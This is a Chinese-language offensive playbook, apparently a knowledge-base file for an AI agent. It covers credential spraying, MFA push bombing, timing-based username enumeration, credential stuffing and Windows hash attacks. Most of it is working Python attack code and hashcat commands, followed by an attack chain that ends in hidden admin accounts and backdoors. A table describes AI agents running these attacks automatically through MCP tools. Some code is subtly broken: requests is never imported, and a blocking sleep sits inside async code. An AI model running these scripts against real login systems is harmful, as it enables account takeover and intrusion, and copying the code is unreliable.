# 高级暴力破解 — 凭证喷洒、MFA 疲劳、Hash 策略

## 场景

暴力破解（Brute Force）早已不是"遍历所有密码"那么简单。现代攻击方法包括：凭证喷洒（1 密码 × N 用户）、MFA 疲劳攻击（推送轰炸）、基于时间的用户名枚举、凭证复用（Credential Stuffing with breached passwords），以及针对哈希而非登录接口的离线破解。本文件覆盖从在线攻击到离线破解的完整方法论。

## 输入信号

- 登录页面返回不同的错误信息："用户名不存在" vs "密码错误"
- 忘记密码/注册接口暴露用户是否存在（用户枚举）
- MFA 没有失败锁定或锁定时间过短（60s 冷却期→可自动化）
- 响应时间差异：有效用户名响应比无效用户名慢 50ms+（时间侧信道）
- 系统使用 NTLM/Kerberos 认证（可中继，不用破解）
- 泄露的密码数据库可用（HaveIBeenPwned / RocketDB / COMB）
- 密码重置链接/令牌可预测（短 token、时间戳编码）
- OAuth/SAML 中存在 token 重放或 weak binding

## 核心方法论

### 1. 凭证喷洒 (Credential Spraying)

凭证喷洒的核心策略：用少量常见密码尝试大量用户名，避免触发账户锁定。

```python
# credential_spraying.py — 高级凭证喷洒

import asyncio, aiohttp, time, random
from dataclasses import dataclass, field

@dataclass
class SprayingConfig:
    target_url: str
    usernames: list
    password: str
    concurrent: int = 20
    delay_between_batches: float = 1.0  # 避免触发速率限制
    headers: dict = field(default_factory=lambda: {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
    })

class CredentialSprayer:
    """高效的凭证喷洒引擎"""

    def __init__(self, config: SprayingConfig):
        self.config = config
        self.successes = []
        self.lock = asyncio.Lock()

    async def attempt_login(self, session: aiohttp.ClientSession, username: str) -> dict:
        """单次登录尝试"""
        try:
            # 随机延迟避免模式识别
            await asyncio.sleep(random.uniform(0.01, 0.05))
            async with session.post(
                self.config.target_url,
                json={"username": username, "password": self.config.password},
                timeout=aiohttp.ClientTimeout(10),
            ) as r:
                text = await r.text()
                return {"username": username, "status": r.status,
                        "text": text[:200]}
        except Exception as e:
            return {"username": username, "error": str(e)}

    async def spray_batch(self, usernames_batch: list) -> list:
        """并发喷洒一批用户名"""
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector,
                                         headers=self.config.headers) as session:
            tasks = [self.attempt_login(session, u) for u in usernames_batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

        return [r for r in results if isinstance(r, dict)]

    def generate_target_usernames(self, domain: str = None) -> list:
        """生成目标用户名列表"""
        usernames = set()

        # 常见账户前缀
        prefixes = ["admin", "test", "info", "support", "sales", "contact",
                     "noreply", "help", "service", "root"]

        # 如果知道域名，生成邮箱格式
        if domain:
            for prefix in prefixes:
                usernames.add(f"{prefix}@{domain}")
            # 常见人名模式
            for name in ["john", "jane", "admin", "manager", "ceo", "hr"]:
                usernames.add(f"{name}@{domain}")

        usernames.update(prefixes)
        return list(usernames)

    async def run(self) -> list:
        """执行完整喷洒攻击"""
        usernames = self.config.usernames
        batch_size = self.config.concurrent
        batches = [usernames[i:i+batch_size] for i in range(0, len(usernames), batch_size)]

        for i, batch in enumerate(batches):
            print(f"[Batch {i+1}/{len(batches)}] Trying {len(batch)} users "
                  f"with password: {self.config.password}")

            results = await self.spray_batch(batch)
            for r in results:
                if r.get("status") == 200:
                    async with self.lock:
                        self.successes.append(r)
                    print(f"  [!] SUCCESS: {r['username']}")

            if i < len(batches) - 1:
                await asyncio.sleep(self.config.delay_between_batches)

        return self.successes

# 使用示例
async def main():
    # 第一步: 用最常见密码喷洒
    common_passwords = [
        "password123", "123456", "admin123", "welcome",
        "P@ssw0rd", "qwerty123", "letmein", "summer2024",
    ]

    # 生成用户名（从公开信息+常见前缀）
    usernames = CredentialSprayer(
        SprayingConfig(target_url="...", usernames=[], password="")
    ).generate_target_usernames(domain="target.com")

    for pwd in common_passwords:
        config = SprayingConfig(
            target_url="https://target.com/api/login",
            usernames=usernames,
            password=pwd,
        )
        sprayer = CredentialSprayer(config)
        results = await sprayer.run()
        if results:
            print(f"Password '{pwd}' → {len(results)} successes!")
            break
```

### 2. MFA 疲劳攻击 (Push Bombing)

MFA 疲劳/推送轰炸是 2024-2025 年最热门的初始入侵向量：

```python
# mfa_fatigue.py — MFA 推送疲劳攻击

import asyncio, aiohttp, time, random

class MFAPushBombing:
    """
    MFA 疲劳攻击 (Push Bombing / MFA Spam)
    
    原理: 连续发送大量 MFA 推送通知, 用户因疲劳误点 "Approve"
    
    真实案例:
    - Uber (2022): 攻击者先拿到员工凭据, 然后持续发 MFA push
      直到用户批准
    - LAPSUS$ 团伙: 标准手法: 购credentials + MFA fatigue → 入侵
    - MGM Resorts (2023): 10 分钟 MFA push 轰炸 → 批准 → Ransomware
    
    关键成功因素:
    1. 已有有效的凭据 (password spray / credential stuffing 获取)
    2. MFA 没有失败次数的锁定 (或锁定周期很短)
    3. 推送间隔合理 (太快会被标记, 太慢用户有时间反应)
    """

    def __init__(self, target_url, username, password):
        self.target_url = target_url
        self.username = username
        self.password = password
        self.session = requests.Session()

    def login(self) -> bool:
        """第一步: 用有效凭据登录, 触发 MFA push"""
        r = self.session.post(f"{self.target_url}/api/login", json={
            "username": self.username,
            "password": self.password,
        })
        # 预期返回 401 / 202 并触发 MFA push
        return r.status_code in (202, 401) and "mfa" in r.text.lower()

    def approve_mfa(self, token: str = None) -> bool:
        """模拟多种 MFA 批准方式"""
        vectors = [
            # 1. 直接调用 MFA 批准 API
            ("POST", "/api/mfa/approve", {"request_id": token}),
            # 2. 通过 OAuth token 重放
            ("POST", "/api/oauth/token", {"grant_type": "mfa_approve"}),
            # 3. 绕过 MFA enrollment 检查
            ("POST", "/api/session/create", {"skip_mfa": True}),
            # 4. 用备用 recovery code
            ("POST", "/api/mfa/recovery", {"code": self._try_recovery_codes()}),
        ]
        for method, path, data in vectors:
            r = self.session.request(method, f"{self.target_url}{path}", json=data)
            if r.status_code == 200:
                return True
        return False

    def _try_recovery_codes(self) -> str:
        """尝试常见或泄露的 recovery code"""
        common_codes = [
            "00000000", "12345678", "11111111", "abcdefgh",
            "0000-0000", "1234-5678", "aaaa-bbbb",
        ]
        return random.choice(common_codes)

    async def fatigue_attack(self, n_attempts=50, interval=30):
        """
        执行 MFA 疲劳攻击
        n_attempts: 推送次数
        interval: 推送间隔(秒)
        """
        for i in range(n_attempts):
            print(f"[MFA Fatigue] Push {i+1}/{n_attempts}")

            # 触发 MFA push
            self.login()
            time.sleep(2)

            # 尝试自动批准 (小概率直接成功)
            if self.approve_mfa():
                print(f"[!] MFA approved on attempt {i+1}")
                return True

            # 等待下次推送
            time.sleep(interval)

        return False

    @staticmethod
    def mfa_bypass_techniques() -> dict:
        """MFA 绕过技术清单"""
        return {
            "零日 MFA": "利用 MFA 实现的 bug, 如 CVE-2025-1094",
            "Session Fixation": "预设 session ID, 等待受害者登录",
            "OAuth Token Theft": "窃取 OAuth token 绕过 MFA enrollment",
            "Legacy Protocol": "IMAP/POP3/SMTP 可能不要求 MFA",
            "API Direct": "调用内部 API 不用 MFA",
            "Backup Code Brute": "恢复码空间不够 (4 位数字)",
            "SMS Interception": "SS7 攻击或 SIM swap",
            "Push Bombing": "本文主要讨论的技术",
        }
```

### 3. 时间侧信道用户名枚举

```python
# timing_enumeration.py — 基于响应时间的用户名枚举

import time, requests, statistics

class TimingBasedEnumeration:
    """
    利用响应时间差异枚举有效用户名
    原理: 有效用户名的密码哈希计算耗时 > 无效用户名的即时返回
    即使错误消息相同 ("用户名或密码错误"), 后端处理路径不同

    常见差异来源:
    - 有效用户: 查 DB → hash(password) → 比较 → 慢
    - 无效用户: 查 DB → 未找到 → 快速返回 → 快
    - 有效但锁定: 查 DB → 找到 → 检查锁定 → 返回 → 中等
    """

    def __init__(self, base_url):
        self.base_url = base_url
        self.passwords = ["Password123!", "P@ssw0rd2024", "Welcome1"]

    def measure_response_time(self, username: str) -> float:
        """测量单次请求响应时间（去极值）"""
        times = []
        for _ in range(5):  # 多次测量取中位数
            start = time.perf_counter()
            r = requests.post(f"{self.base_url}/api/login", json={
                "username": username,
                "password": "random_incorrect_password_xyz",
            })
            elapsed = time.perf_counter() - start
            times.append(elapsed)

        # 去掉最高最低
        times.sort()
        return statistics.median(times[1:-1])

    def enumerate_users(self, usernames: list, threshold_ms: float = 50.0) -> list:
        """
        枚举有效用户名
        threshold_ms: 有效/无效用户的响应时间差异阈值
        """
        # 第一步: 建立基线 (确定不存在的用户)
        baseline_times = []
        for fake_user in ["thisuserdoesnotexist_001",
                          "nonexistent_user_002",
                          "invalid_003_xyz"]:
            t = self.measure_response_time(fake_user)
            baseline_times.append(t)

        baseline = statistics.median(baseline_times)
        baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 5
        baseline_stdev = max(baseline_stdev, 0.002)  # 最小 2ms

        print(f"Baseline: {baseline*1000:.1f}ms ± {baseline_stdev*1000:.1f}ms")

        # 第二步: 测试目标用户名
        valid_usernames = []
        for username in usernames:
            t = self.measure_response_time(username)
            diff_ms = (t - baseline) * 1000

            if diff_ms > threshold_ms:
                valid_usernames.append({
                    "username": username,
                    "response_time_ms": t * 1000,
                    "diff_ms": diff_ms,
                    "likely": "valid" if diff_ms > threshold_ms * 3 else "uncertain"
                })
                print(f"  [+] {username:30s} → {t*1000:.1f}ms (Δ {diff_ms:.1f}ms)")

        return valid_usernames
```

### 4. 密码复用链 (Credential Stuffing)

```python
# credential_stuffing.py — 凭证复用批量测试

import asyncio, aiohttp
from typing import List, Tuple

class CredentialStuffing:
    """
    凭证复用攻击
    使用泄露数据库中的 (email:password) 对测试目标
    
    数据来源:
    1. HaveIBeenPwned 的 SHA1 hash 范围（不泄露明文）
    2. RocketDB / COMB (Combination of Many Breaches)
    3. 针对特定服务的泄露 (LinkedIn, Collection #1-#5)
    4. 暗网/Telegram 的 stolen credentials dumps
    """

    COMMON_BREACH_PATTERNS = [
        # 邮箱格式: firstname.lastname@company.com
        # 密码: CompanyName@2024, CompanyName123!
        "password123", "123456", "company@2024",
        "Summer2024!", "P@ssw0rd", "Welcome1",
        "Changeme1!", "LetMeIn123", "Admin@123",
    ]

    async def stuff_async(self, creds: List[Tuple[str, str]],
                          target_url: str, max_concurrent=50) -> List[dict]:
        """异步批量测试凭证复用"""
        sem = asyncio.Semaphore(max_concurrent)
        results = []

        async def test_one(email: str, password: str) -> dict:
            async with sem:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(
                            target_url,
                            json={"email": email, "password": password},
                            timeout=aiohttp.ClientTimeout(10)
                        ) as r:
                            text = await r.text()
                            return {
                                "email": email,
                                "password": password[:8] + "...",
                                "status": r.status,
                                "success": r.status == 200,
                            }
                except Exception as e:
                    return {"email": email, "error": str(e)}

        tasks = [test_one(email, pwd) for email, pwd in creds]
        for fut in asyncio.as_completed(tasks):
            result = await fut
            results.append(result)
            if result.get("success"):
                print(f"[!] Valid credential: {result['email']}")

        return results
```

### 5. Hash 攻击链 (不破解)

对于无法在线爆破的密码，转离线攻击：

```python
# hash_strategy.py — 高级哈希攻击策略

"""
核心原则: 不破解 → 中继 → 重用 → 破解(最后手段)

优先顺序:
1. Pass-the-Hash (PtH): 用 NTLM hash 直接认证
2. Kerberoasting: 请求 TGS 票据离线破解服务账号密码
3. AS-REP Roasting: 找没有 pre-authentication 的用户
4. NTLM Relay: 中继 NTLM 认证到其他服务
5. Net-NTLMv2 → 离线破解 (用 GPU)
6. DCSync: 域控制器同步获取所有 hash
"""

class HashAttackChain:
    """
    Windows 凭证哈希攻击链
    
    典型流程:
    Step 1: 获取一个初始立足点 (低权限)
    Step 2: 提取内存中的 hash (Mimikatz / LSASS dump)
    Step 3: Pass-the-Hash 横向移动到其他机器
    Step 4: Kerberoast 提取服务账号 hash
    Step 5: 离线破解或 AS-REP Roasting
    """

    @staticmethod
    def hashcat_commands() -> dict:
        """Hashcat 常用攻击模式"""
        return {
            "NTLM": "hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule",
            "Net-NTLMv2": "hashcat -m 5600 -a 0 hashes.txt wordlist.txt -r rules/best64.rule",
            "Kerberos 5 TGS": "hashcat -m 13100 -a 0 hashes.txt wordlist.txt",
            "AS-REP": "hashcat -m 18200 -a 0 hashes.txt wordlist.txt",
            "bcrypt": "hashcat -m 3200 -a 3 hashes.txt ?l?l?l?l?l?l?l",
            "SHA512 crypt": "hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a?a?a?a?a",
        }

    @staticmethod
    def rule_generation() -> str:
        """针对目标的密码规则生成"""
        # 目标信息: 公司名, 创始人, 成立年份
        rules = """
# 公司名相关规则
$2024
$!
c $2024
$2024!
c $!

# 年份变体
$19$90
$20$24

# 季节变体
Summer$2024
Winter$2023

# 特殊字符插入
^P@$$
^!
"""
        return rules

    @staticmethod
    def gpu_cracking_speed() -> dict:
        """GPU 破解速度估算 (NVIDIA RTX 4090)"""
        return {
            "NTLM": "~300 GH/s (3000 亿 hash/秒)",
            "Net-NTLMv2": "~30 GH/s",
            "bcrypt (cost=5)": "~200 kH/s",
            "bcrypt (cost=10)": "~10 kH/s",
            "SHA-512": "~500 MH/s",
            "MD5": "~50 GH/s",
        }
```

### 6. 真实 CVE 与事件分析

| CVE/事件 | 类型 | 细节 |
|----------|------|------|
| Okta 2023 入侵 | MFA 疲劳 | 攻击者使用 1Password 泄露的凭据 + MFA push bombing 入侵 Okta 支持系统 |
| Uber 2022 入侵 | MFA 疲劳+MFA 批准 | 攻击者购买内部员工的凭据, 持续发 MFA push 直到用户批准 |
| MGM 2023 (ALPHV/BlackCat) | MFA 疲劳 | 10 分钟 MFA push 轰炸 → 用户批准 → Ransomware 部署, 损失 $1 亿+ |
| CVE-2024-27316 | HTTP/2 Rapid Reset | 利用 HTTP/2 流重置实现 DDoS, 但也可用于爆破速率限制绕过 |
| CVE-2024-1709 | ConnectWise ScreenConnect | 认证绕过导致可无限制爆破, CVSS 10.0 |
| CVE-2024-27198 | TeamCity (CVSS 9.8) | 认证绕过 + 路径遍历, 无需密码即可执行管理操作, 可配合凭证喷洒 |

## 攻击链

```
Phase 1 — 侦察
  ├── 用户枚举 (注册/忘记密码/时间侧信道)
  ├── 泄露数据查询 (breach databases)
  ├── 社交媒体收集 (LinkedIn → 员工邮箱)
  └── MFA 类型识别 (push/SMS/TOTP/hardware)

Phase 2 — 在线攻击
  ├── 凭证喷洒: 3-5 常见密码 × 所有用户名
  ├── 密码复用: 泄露数据中的 credential pairs
  ├── MFA 疲劳: 已有凭据 + 连续推送
  └── 竞态绕过: 并发登录绕过锁定

Phase 3 — 离线攻击
  ├── Hash 获取 (Mimikatz / LSASS / NTDS.dit)
  ├── Pass-the-Hash 横向移动
  ├── Kerberoasting / AS-REP Roasting
  └── GPU 加速 hashcat 破解

Phase 4 — 权限维持
  ├── 创建隐藏管理员账户
  ├── 植入持久化后门
  └── OAuth token 窃取和重放
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动执行上述攻击：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测用户枚举 | `http_probe` | 测试注册/登录端点响应差异 |
| 按信号查知识库 | `kb_router` | 搜索 credential spraying / MFA bypass 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 运行扫描工具 | `run_ctf_tool` | 运行凭证喷洒/MFA 疲劳脚本 |

## 参考资料

- CWE-307: Improper Restriction of Excessive Authentication Attempts
- CWE-521: Weak Password Requirements
- NIST SP 800-63B: Digital Identity Guidelines — Authentication
- Mitre ATT&CK: T1110 — Brute Force; T1621 — Multi-Factor Authentication Request Generation
- "MGM Resorts Cybersecurity Attack" (2023) — Analysis by VX-Underground
- "Uber Breach 2022" — Analysis by LAPSUS$ TTPs
- Hashcat Wiki: Example Hash Formats & Attack Modes

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
